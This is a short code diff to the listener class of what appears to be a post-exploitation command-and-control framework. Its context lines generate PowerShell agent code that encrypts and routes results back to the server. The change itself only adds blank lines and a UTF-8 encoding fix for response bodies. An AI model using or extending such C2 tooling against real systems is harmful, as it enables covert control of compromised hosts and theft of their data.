@@ -846,6 +846,7 @@ class Listener(object):
                 sendMessage += "$EncBytes = Encrypt-Bytes $Packets;"
                 sendMessage += "$RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;"
                 sendMessage += "$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);"
+
                 sendMessage += profile.post.client.output.generate_powershell("$RoutingPacket")
 
                 # ==== BUILD REQUEST ====
@@ -906,6 +907,7 @@ class Listener(object):
                 sendMessage += "};"
 
                 return updateServers + getTask + sendMessage + "\n'New agent comms registered!'"
+
 
             elif language.lower() == 'python':
                 # Python
@@ -1253,6 +1255,8 @@ class Listener(object):
 
                                             # build malleable response with results
                                             malleableResponse = implementation.construct_server(results)
+                                            if isinstance(malleableResponse.body, str):
+                                                malleableResponse.body = malleableResponse.body.encode('UTF-8')
                                             return Response(malleableResponse.body, malleableResponse.code, malleableResponse.headers)
 
                                 else:
